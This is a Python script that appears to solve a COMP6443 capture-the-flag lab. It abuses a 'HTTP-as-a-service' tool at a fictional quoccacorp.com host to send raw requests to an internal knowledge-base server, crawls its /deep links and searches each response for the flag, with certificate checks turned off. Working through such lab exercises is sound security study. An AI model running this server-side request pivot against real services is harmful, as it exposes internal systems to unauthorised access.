import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

s = requests.session()
s.verify = False
s.proxies = {"https": "http://127.0.0.1:8080"} # Route through Burp to monitor

haas_url = "https://haas-v3.quoccacorp.com"
kb_host = "kb.quoccacorp.com"
visited = set()
queue = ["/"] # We start at the root of the internal KB

print("[*] Tunneling through HaaS to crawl kb.quoccacorp.com...")

while queue:
    path = queue.pop(0)
    if path in visited:
        continue
    visited.add(path)

    # Construct the RAW HTTP request that the HaaS tool expects in 'requestBox'
    raw_http = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {kb_host}\r\n"
        "Connection: close\r\n\r\n"
    )

    try:
        # We POST the raw request to the HaaS tool
        r = s.post(haas_url, data={"requestBox": raw_http}, timeout=10)
        
        # The HaaS tool likely returns the KB's response inside its own HTML
        # We search the whole response body for the flag
        if "COMP6443{" in r.text:
            flag = re.search(r"COMP6443\{.*?\}", r.text).group(0)
            print(f"\n\n[!] FLAG FOUND at {path}: {flag}")
            break

        # Extract links from the returned KB content
        # Note: These links look like /deep/XXXXX
        links = re.findall(r'href=["\']?(/deep/[^"\'>\s]+)["\']?', r.text)
        
        # Also handle the initial /deep link
        if "/deep" not in visited:
             initial_deep = re.findall(r'href=["\']?(/deep)["\']?', r.text)
             links.extend(initial_deep)

        for link in links:
            if link not in visited:
                queue.append(link)

        print(f"[*] Explored: {len(visited)} | Queue: {len(queue)} | Current Internal Path: {path}", end="\r")

    except Exception as e:
        print(f"\n[!] Error on path {path}: {e}")
        continue

print("\n[*] Search finished.")